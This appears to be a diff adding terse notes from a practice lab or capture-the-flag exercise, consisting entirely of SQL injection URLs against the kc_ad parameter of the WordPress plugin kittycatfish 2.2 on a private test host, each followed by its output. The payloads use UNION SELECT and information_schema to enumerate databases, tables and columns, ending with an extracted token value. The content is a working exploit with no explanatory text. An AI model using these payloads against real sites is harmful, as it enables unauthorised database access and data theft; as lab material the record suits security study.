@@ -1,0 +1,22 @@
+http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(schema_name)%20FROM%20information_schema.schemata)
+
+information_schema,testlabdb
+
+http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(table_name)%20FROM%20information_schema.tables)
+
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,
+GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,
+REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,
+TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,
+INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,
+INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,tl_token,wp_commentmeta,wp_comments,wp_links,wp_options,wp_postmeta,wp_posts,
+wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_terms,wp_usermeta,wp_users
+
+http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(table_name)%20FROM%20information_schema.tables WHERE table_schema=0x746573746c61626462)
+
+tl_token,wp_commentmeta,wp_comments,wp_links,wp_options,wp_postmeta,wp_posts,wp_term_relationships,
+wp_term_taxonomy,wp_termmeta,wp_terms,wp_usermeta,wp_users
+
+http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns WHERE table_name=0x746c5f746f6b656e)
+
+token: Site_on_dark_side
